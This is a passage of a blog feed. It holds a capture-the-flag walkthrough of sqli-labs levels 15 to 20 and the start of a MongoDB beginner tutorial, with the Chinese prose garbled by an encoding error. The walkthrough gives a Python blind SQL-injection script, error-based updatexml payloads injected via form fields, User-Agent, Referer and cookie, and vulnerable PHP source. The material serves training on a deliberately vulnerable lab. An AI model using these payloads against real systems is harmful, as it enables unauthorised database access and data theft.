class="string">&quot;http://127.0.0.1:8080&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">key_of_true = <span class="string">&#x27;flag.jpg&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://21b39a7b-a1e6-48ac-8fc8-88c3ba78e2bf.node5.buuoj.cn/Less-15/&quot;</span></span><br><span class="line">sql = <span class="string">&quot;select flag from ctftraining.flag&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Submit&#x27;</span>: <span class="string">&#x27;submit&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">&quot;a&#x27; or (ascii(substr(&quot;</span> + <span class="string">&#x27;(&#x27;</span> + sql + <span class="string">&#x27;)&#x27;</span> + <span class="string">&quot;,&#123;&#125;,1))&gt;&#123;&#125;)-- &quot;</span>  <span class="comment">#è¿™é‡Œæ³¨é‡Šç¬¦å·å¿…é¡»æ˜¯`-- `è€Œä¸æ˜¯`--+`</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line">    mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">min</span> &lt; <span class="built_in">max</span>):</span><br><span class="line">        data[<span class="string">&#x27;uname&#x27;</span>] = payload.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> key_of_true <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h1><p><code>&quot;)</code>é—­åˆ</p><p>å°†less-15çš„expä¸­çš„payloadå˜é‡æ”¹ä¸º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&quot;) or (ascii(substr(&#x27;</span> + <span class="string">&#x27;(&#x27;</span> + sql + <span class="string">&#x27;)&#x27;</span> + <span class="string">&#x27;,&#123;&#125;,1))&gt;&#123;&#125;)-- &#x27;</span></span><br></pre></td></tr></table></figure><p>å³å¯</p><h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1><p>å’Œä¹‹å‰çš„æŸ¥è¯¢è¯­å¥ä¸åŒ,æ­¤å…³ä¸ºupdateè¯­å¥, æ‰€ä»¥è”åˆæŸ¥è¯¢ä»€ä¹ˆçš„å°±ç”¨ä¸äº†</p><p>åç«¯sqlè¯­å¥å¤§çº¦ä¸º:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> passwd <span class="operator">=</span> <span class="string">&#x27;$passwd&#x27;</span> <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span></span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯,è¿™é‡Œçš„æ³¨å…¥ç‚¹åœ¨passwdè€Œä¸æ˜¯ä¹‹å‰çš„uname</p><p>å› ä¸ºè¿™é‡Œunameä¼¼ä¹åŠ äº†waf</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=admin&#x27; and updatexml(1,concat(0x7e,(select substr(flag,1,30) from ctftraining.flag),0x7e),1)#&amp;Submit=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219191011975.png" alt="image-20240219191011975"></p><p>æŸ¥çœ‹ä¸€ä¸‹æºç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br></pre></td></tr></table></figure><p>ç¡®å®åšäº†waf</p><h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1><p>æ­¤é¢˜åœ¨UAå¤„å­˜åœ¨sqlæ³¨å…¥</p><p>åç«¯æ‰§è¡Œçš„sqlè¯­å¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥è·å–headersä¸­çš„User-Agentå¹¶æ’å…¥åˆ°æ•°æ®åº“ä¸­</p><p>ä¸”è¾“å…¥å•å¼•å·åä¼šå›æ˜¾æŠ¥é”™ä¿¡æ¯</p><p>å¯å¯¹uaè¿›è¡ŒæŠ¥é”™æ³¨å…¥</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: 1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;</span><br></pre></td></tr></table></figure><p>æ‹¼æ¥ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure><p>è·å–flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219194146867.png" alt="image-20240219194146867"></p><h1 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1><p>ç›¸åŒçš„é…æ–¹,åªä¸è¿‡è¿™æ¬¡æ³¨å…¥ç‚¹åœ¨Referer</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219194408905.png" alt="image-20240219194408905"></p><h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1><p>é¢˜ç›®ç»™çš„tagæ˜¯Cookieæ³¨å…¥,ä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰set-cookie</p><p>æŸ¥çœ‹äº†ä¸€ä¸‹æºç ,æ¯”è¾ƒå…³é”®çš„å‡ å¥:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Issue with your mysql: &#x27;</span> . <span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your ID:&#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦è‡ªå·±è®¾ç½®ä¸€ä¸ªåä¸ºunameçš„cookie</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219201031236.png" alt="image-20240219201031236"></p><p>æ³¨æ„æ­¤æ—¶POSTä¸­ä¸èƒ½æäº¤submitæ•°æ®,æºç ä¸­çš„æŸ¥è¯¢è¯­å¥åªæœ‰åœ¨è¡¨å•ä¸­æ²¡è®¾ç½®submitæ—¶æ‰ä¼šè§¦å‘</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Less-1&quot;&gt;&lt;a href=&quot;#Less-1&quot; class=&quot;headerlink&quot; title=&quot;Less-1&quot;&gt;&lt;/a&gt;Less-1&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
      
    
    
    
    <category term="é¶åœº" scheme="http://example.com/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="sqlæ³¨å…¥" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>MongoDBåˆä½“éªŒ</title>
    <link href="http://example.com/2024/02/01/MongoDB%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://example.com/2024/02/01/MongoDB%E5%88%9D%E4%BD%93%E9%AA%8C/</id>
    <published>2024-02-01T15:53:50.000Z</published>
    <updated>2024-02-01T16:49:08.174Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å®‰è£…MongoDB"><a href="#å®‰è£…MongoDB" class="headerlink" title="å®‰è£…MongoDB"></a>å®‰è£…MongoDB</h1><p>MongoDB server:<a href="https://www.mongodb.com/try/download/community">https://www.mongodb.com/try/download/community</a></p><p>å®¢æˆ·ç«¯mongo shell:<a href="https://www.mongodb.com/try/download/shell">https://www.mongodb.com/try/download/shell</a></p><p>å®‰è£…ç¯å¢ƒ: Ubuntu 22.04</p><h2 id="mongo-server"><a href="#mongo-server" class="headerlink" title="mongo server"></a>mongo server</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i mongodb-org-server_7.0.5_amd64.deb</span><br></pre></td></tr></table></figure><p>å¯åŠ¨:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start mongod.service</span><br></pre></td></tr></table></figure><h2 id="mongo-shell"><a href="#mongo-shell" class="headerlink" title="mongo shell"></a>mongo shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf mongosh-x.x.x-linux-x64.tgz</span><br></pre></td></tr></table></figure><p>åœ¨<code>mongosh-x.x.x-linux-x64/bin</code>ç›®å½•ä¸‹æ“ä½œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">cp</span> mongosh /usr/local/bin/</span><br><span class="line">sudo <span class="built_in">cp</span> mongosh_crypt_v1.so /usr/local/lib/</span><br></pre></td></tr></table></figure><h2 id="è¿æ¥"><a href="#è¿æ¥" class="headerlink" title="è¿æ¥"></a>è¿æ¥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongosh --host 127.0.0.1 --port 27017</span><br></pre></td></tr></table></figure><h1 id="ä¸ä¼ ç»Ÿçš„mysqlç±»æ¯”"><a href="#ä¸ä¼ ç»Ÿçš„mysqlç±»æ¯”" class="headerlink" title="ä¸ä¼ ç»Ÿçš„mysqlç±»æ¯”"></a>ä¸ä¼ ç»Ÿçš„mysqlç±»æ¯”</h1><table><thead><tr><th>SQL æ¦‚å¿µ</th><th>MongoDB æ¦‚å¿µ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>database</td><td>database</td><td>æ•°æ®åº“</td></tr><tr><td>table</td><td>collection</td><td>æ•°æ®åº“è¡¨&#x2F;é›†åˆ</td></tr><tr><td>row</td><td>document</td><td>æ•°æ®è®°å½•è¡Œ&#x2F;æ–‡æ¡£</td></tr><tr><td>column</td><td>field</td><td>æ•°æ®å­—æ®µ&#x2F;åŸŸ</td></tr><tr><td>index</td><td>index</td><td>ç´¢å¼•</td></tr><tr><td>table joins</td><td></td><td>è¡¨è¿æ¥ï¼ŒMongoDB ä¸æ”¯æŒ</td></tr><tr><td>primary key</td><td>primary key</td><td>ä¸»é”®ï¼ŒMongoDB è‡ªåŠ¨å°† <code>_id</code> å­—æ®µè®¾ç½®ä¸ºä¸»é”®</td></tr></tbody></table><p>MongoDB å°†æ•°æ®å­˜å‚¨ä¸ºä¸€ä¸ªæ–‡æ¡£ï¼Œæ•°æ®ç»“æ„ç”±é”®å€¼ï¼ˆkey&#x3D;&gt;valueï¼‰å¯¹ç»„æˆã€‚MongoDB æ–‡æ¡£ç±»ä¼¼äº JSON å¯¹è±¡ã€‚å­—æ®µå€¼å¯ä»¥åŒ…å«å…¶ä»–æ–‡æ¡£ï¼Œæ•°ç»„åŠæ–‡æ¡£æ•°ç»„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),</span><br><span class="line">    &quot;name&quot; : &quot;whoami&quot;,</span><br><span class="line">    &quot;description&quot; : &quot;the admin user&quot;,</span><br><span class="line">    &quot;age&quot; : 19,</span><br><span class="line">    &quot;status&quot; : &quot;A&quot;,</span><br><span class="line">    &quot;groups&quot; : [</span><br><span class="line">        &quot;admins&quot;,</span><br><span class="line">        &quot;users&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h1><p>æˆ‘ä»¬ä½¿ç”¨use usersæ¥è½¬åˆ°usersæ•°æ®åº“,å¦‚æœæ²¡æœ‰, å°†ä¼š__è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª__,å³ä½¿ç”¨use usersæ¥åˆ›å»ºä¸€ä¸ªæ•°æ®åº“</p><p>æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> dbs</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240202001642138.png" alt="image-20240202001642138"></p><p>å¹¶æ²¡æœ‰å‡ºç°users,å› ä¸ºéœ€è¦å…ˆæ’å…¥æ•°æ®</p><h3 id="æ·»åŠ ä¸€ä¸ªé›†åˆ"><a href="#æ·»åŠ ä¸€ä¸ªé›†åˆ" class="headerlink" title="æ·»åŠ ä¸€ä¸ªé›†åˆ"></a>æ·»åŠ ä¸€ä¸ªé›†åˆ</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.createCollection(&quot;all_users&quot;)</span><br></pre></td></tr></table></figure><h3 id="å‘é›†åˆä¸­æ’å…¥ä¸€ä¸ªæ–‡æ¡£"><a href="#å‘é›†åˆä¸­æ’å…¥ä¸€ä¸ªæ–‡æ¡£" class="headerlink" title="å‘é›†åˆä¸­æ’å…¥ä¸€ä¸ªæ–‡æ¡£"></a>å‘é›†åˆä¸­æ’å…¥ä¸€ä¸ªæ–‡æ¡£</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.all_users.insert(&#123;name: <span class="string">&#x27;whoami&#x27;</span>, </span><br><span class="line">    description: <span class="string">&#x27;the admin user&#x27;</span>,</span><br><span class="line">    age: <span class="number">19</span>,</span><br><span class="line">    status: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="keyword">groups</span>: [<span class="string">&#x27;admins&#x27;</span>, <span class="string">&#x27;users&#x27;</span>]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="æ›´æ–°æ–‡æ¡£å†…å®¹"><a href="#æ›´æ–°æ–‡æ¡£å†…å®¹" class="headerlink" title="æ›´æ–°æ–‡æ¡£å†…å®¹"></a>æ›´æ–°æ–‡æ¡£å†…å®¹</h3><h4 id="update-æ–¹æ³•"><a href="#update-æ–¹æ³•" class="headerlink" title="update()æ–¹æ³•"></a>update()æ–¹æ³•</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.all_users.update(&#123; <span class="string">&#x27;age&#x27;</span>: <span class="number">19</span> &#125;, &#123; $<span class="keyword">set</span>: &#123; <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span> &#125; &#125;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240202002705382.png" alt="image-20240202002705382"></p><p>æ­¤æ—¶æ–‡æ¡£å†…å®¹å·²ç»æ›´æ–°äº†</p><h4 id="save-æ–¹æ³•"><a href="#save-æ–¹æ³•" class="headerlink" title="save()æ–¹æ³•"></a>save()æ–¹æ³•</h4><p>save() æ–¹æ³•é€šè¿‡ä¼ å…¥çš„æ–‡æ¡£æ¥æ›¿æ¢å·²æœ‰æ–‡æ¡£ï¼Œ<code>_id</code> ä¸»é”®å­˜åœ¨å°±æ›´æ–°ï¼Œä¸å­˜åœ¨å°±æ’å…¥.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.all_users.save(&#123;</span><br><span class="line">    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),</span><br><span class="line">    &quot;name&quot; : &quot;whoami&quot;,</span><br><span class="line">    &quot;description&quot; : &quot;the admin user&quot;,</span><br><span class="line">    &quot;age&quot; : <span class="number">21</span>,</span><br><span class="line">    &quot;status&quot; : &quot;A&quot;,</span><br><span class="line">    &quot;groups&quot; : [</span><br><span class="line">        &quot;admins&quot;,</span><br><span class="line">        &quot;users&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="æŸ¥è¯¢æ–‡æ¡£"><a href="#æŸ¥è¯¢æ–‡æ¡£" class="headerlink" title="æŸ¥è¯¢æ–‡æ¡£"></a>æŸ¥è¯¢æ–‡æ¡£</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.collection.find(query, projection)</span><br><span class="line">queryï¼šå¯é€‰ï¼Œä½¿ç”¨æŸ¥è¯¢æ“ä½œç¬¦æŒ‡å®šæŸ¥è¯¢æ¡ä»¶ï¼Œç›¸å½“äº <span class="keyword">sql</span> <span class="keyword">select</span> è¯­å¥ä¸­çš„ <span class="keyword">where</span> å­å¥ã€‚</span><br><span class="line">projectionï¼šå¯é€‰ï¼Œä½¿ç”¨æŠ•å½±æ“ä½œç¬¦æŒ‡å®šè¿”å›çš„é”®ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span>db.all_users.find(&#123;<span class="string">&#x27;age&#x27;</span>:<span class="number">20</span>&#125;)</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&#x27;65bbc283f0e284c714c16a06&#x27;</span>),</span><br><span class="line">    name: <span class="string">&#x27;whoami&#x27;</span>,</span><br><span class="line">    description: <span class="string">&#x27;the admin user&#x27;</span>,</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">    status: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="keyword">groups</span>: [ <span class="string">&#x27;admins&#x27;</span>, <span class="string">&#x27;users&#x27;</span> ]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="MongoDB-ä¸-RDBMS-Where-è¯­å¥çš„æ¯”è¾ƒ"><a href="#MongoDB-ä¸-RDBMS-Where-è¯­å¥çš„æ¯”è¾ƒ" class="headerlink" title="MongoDB ä¸ RDBMS Where è¯­å¥çš„æ¯”è¾ƒ"></a>MongoDB ä¸ RDBMS Where è¯­å¥çš„æ¯”è¾ƒ</h3><p>å¦‚æœä½ ç†Ÿæ‚‰å¸¸è§„çš„ SQL æ•°æ®ï¼Œé€šè¿‡ä¸‹è¡¨å¯ä»¥æ›´å¥½çš„ç†è§£ MongoDB çš„æ¡ä»¶è¯­å¥æŸ¥è¯¢ï¼š</p><table><thead><tr><th>æ“ä½œ</th><th>æ ¼å¼</th><th>èŒƒä¾‹</th><th>RDBMS ä¸­çš„ç±»ä¼¼è¯­å¥</th></tr></thead><tbody><tr><td>ç­‰äº</td><td><code>&#123;&lt;key&gt;:&lt;value&gt;&#125;</code></td><td><code>db.love.find(&#123;&quot;name&quot;:&quot;whoami&quot;&#125;).pretty()</code></td><td><code>where name = &#39;whoami&#39;</code></td></tr><tr><td>å°äº</td><td><code>&#123;&lt;key&gt;:&#123;$lt:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lt:19&#125;&#125;).pretty()</code></td><td><code>where age &lt; 19</code></td></tr><tr><td>å°äºæˆ–ç­‰äº</td><td><code>&#123;&lt;key&gt;:&#123;$lte:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lte:19&#125;&#125;).pretty()</code></td><td><code>where likes &lt;= 19</code></td></tr><tr><td>å¤§äº</td><td><code>&#123;&lt;key&gt;:&#123;$gt:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gt:19&#125;&#125;).pretty()</code></td><td><code>where likes &gt; 19</code></td></tr><tr><td>å¤§äºæˆ–ç­‰äº</td><td><code>&#123;&lt;key&gt;:&#123;$gte:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gte:19&#125;&#125;).pretty()</code></td><td><code>where likes &gt;= 19</code></td></tr><tr><td>ä¸ç­‰äº</td><td><code>&#123;&lt;key&gt;:&#123;$ne:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$ne:19&#125;&#125;).pretty()</code></td><td><code>where likes != 19</code></td></tr></tbody></table><h3 id="AND"><a href="#AND" class="headerlink" title="AND"></a>AND</h3><p>åœ¨MongDBä¸­ é€—å·å°±ç›¸å½“äºAND</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.all_users.find(&#123;&quot;status&quot;:&quot;A&quot;, &quot;age&quot;:<span class="number">20</span>&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240202003723359.png" alt="image-20240202003723359"></p><h3 id="OR"><a href="#OR" class="headerlink" 